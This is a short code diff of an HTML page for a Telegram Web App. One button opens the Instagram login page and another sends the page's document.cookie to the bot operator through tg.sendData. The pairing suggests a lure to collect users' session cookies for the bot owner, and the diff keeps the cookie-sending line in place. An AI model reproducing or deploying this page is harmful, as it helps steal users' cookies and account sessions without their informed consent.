@@ -24,13 +24,13 @@
         const tg = Telegram.WebApp;
 
         document.getElementById("open").onclick = () => {
-            window.location.href = "https://www.instagram.com/accounts/login/";
+            tg.openLink("https://www.instagram.com/accounts/login/");
         };
 
         document.getElementById("send").onclick = () => {
-            const cookies = document.cookie;
-            tg.sendData(cookies);
+            tg.sendData(document.cookie);
         };
     </script>
+
 </body>
 </html>
